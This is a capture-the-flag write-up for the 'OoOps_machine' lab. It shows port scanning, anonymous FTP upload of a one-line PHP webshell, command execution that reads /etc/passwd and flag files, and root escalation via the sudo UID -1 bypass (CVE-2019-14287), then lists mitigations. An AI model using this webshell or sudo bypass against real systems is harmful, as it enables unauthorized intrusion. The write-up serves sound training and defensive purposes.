---
layout: post
title: "OoOps_machine — TFM CTF"
description: "Anonymous FTP con acceso de escritura al webroot, webshell PHP y escalada de privilegios via CVE-2019-14287 (sudo UID -1 bypass)."
categories: [machines]
tags: [tfm, webshell, cve-2019-14287]
author: "Enrique Álvarez González"
---

## Contenido
{: .no_toc }

1. TOC
{:toc}

---

## Recon

Starting with a full TCP port scan:

```bash
nmap -p- --open -sT -T3 -v -n TARGET_IP
```

> `-p-` scans all 65535 ports. `-sT` does a full TCP connect scan — used here instead of `-sS` (SYN scan) because SYN requires root privileges to send raw packets. `--open` filters out closed and filtered ports. `-v` shows open ports in real time as they are found.

Four ports open: 21, 22, 80, 8080.

Targeted version and NSE script scan on those:

```bash
nmap -sC -sV -p 21,22,80,8080 TARGET_IP
```

- **Port 21 — FTP (vsFTPd 3.0.3):** The `ftp-anon` NSE script detects **anonymous login allowed**. Directory `html` listed with `drwxrwxrwx` permissions — world-writable. Worth investigating.
- **Port 22 — SSH (OpenSSH 7.6p1, Ubuntu 18.04)**
- **Port 80 — HTTP (Apache 2.4.66 Debian):** Default Apache page.
- **Port 8080 — HTTP (Apache 2.4.29 Ubuntu):** Title "Prueba de PHP".

---

## Enumeration

### Directory fuzzing

```bash
gobuster dir -u http://TARGET_IP:80  -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
gobuster dir -u http://TARGET_IP:8080 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,html,txt
```

> `-t 50` sets 50 concurrent threads. `-x` appends each extension to every wordlist entry, widening coverage.

**Port 80:** `index.html`, `index.php`, `db.php`, `news.php`, `server-status` (Apache `mod_status` exposed without authentication), and `test.php` (78 KB — live `phpinfo()` output).

**Port 8080:** just `index.php`, returning *"Soy la maquina OoOps machine. Parece que quieres jugar..."*

### FTP — verifying anonymous write access

```bash
ftp TARGET_IP
# user: anonymous / password: (empty)
cd html
put test.txt
bye
```

Checking `http://TARGET_IP:8080/test.txt` in a browser — the file is served directly. The FTP `html` directory **is the Apache document root for port 8080**. Anything uploaded via FTP is immediately accessible through the web server.

---

## Exploitation

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
ftp TARGET_IP
cd html
put shell.php
bye

curl "http://TARGET_IP:8080/shell.php?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as `www-data`. Finding the flag:

```bash
curl "http://TARGET_IP:8080/shell.php?cmd=cat+/etc/passwd" | grep bash
curl "http://TARGET_IP:8080/shell.php?cmd=find+/home+-name+flag*+2>/dev/null"
curl "http://TARGET_IP:8080/shell.php?cmd=cat+/home/hacker/flag.txt"
```

> This matches the CTF hint: *"you access as one user, but the flag belongs to another"*.

```
Flag 1: 244cdf401e667cca77b8228066096985
```

---

## Privilege Escalation

### Leaking credentials via process list

```bash
curl "http://TARGET_IP:8080/shell.php?cmd=ps+aux"
```

One line stands out:

```
root  60  /bin/bash ./myhacker.sh tefeme_86_pass
```

Plaintext password as a command-line argument — visible to any user via `ps aux` (CWE-214).

```bash
ssh hacker@TARGET_IP
# password: tefeme_86_pass  → works (credential reuse)

sudo -l
# User hacker may run (ALL, !root) ALL
```

### CVE-2019-14287 — sudo UID -1 bypass

The rule `(ALL, !root) ALL` looks like it blocks root. It does not. When you pass `-1` to `sudo -u#`, sudo maps it internally to UID `0`. The `!root` check only compares the username string, not the resolved UID. CVSS 8.8 (High). Affects sudo < 1.8.28.

```bash
sudo -u#-1 /bin/bash
whoami   # root
cat /root/flag.txt
```

```
Flag 2: 648d390c021ce7cfde2f95ea3fcd71ec
```

---

## Vulnerability Summary

| ID | Vulnerability | CWE | CVSS v3.1 |
|---|---|---|---|
| V1 | Anonymous FTP with write access to webroot | CWE-276 | — |
| V2 | `phpinfo()` exposed in production | CWE-200 | — |
| V3 | `mod_status` accessible without authentication | CWE-200 | 5.3 |
| V4 | Credentials passed as process argument | CWE-214 | 5.5 |
| V5 | CVE-2019-14287 — `sudo` bypass via UID -1 | CWE-755 | 8.8 |

---

## Mitigations

**V1:** Set `anonymous_enable=NO` in `/etc/vsftpd.conf`. Keep FTP root and web root on separate paths.

**V2:** Delete `test.php`. Diagnostic files belong in dev environments only.

**V3:** Restrict or disable `mod_status`:
```apache
<Location "/server-status">
    Require ip 127.0.0.1
</Location>
```

**V4:** Never pass secrets as CLI arguments. Use environment variables or files with `chmod 600`.

**V5:** Update sudo to ≥ 1.8.28. Replace `!root` exclusion rules with explicit allowed commands.
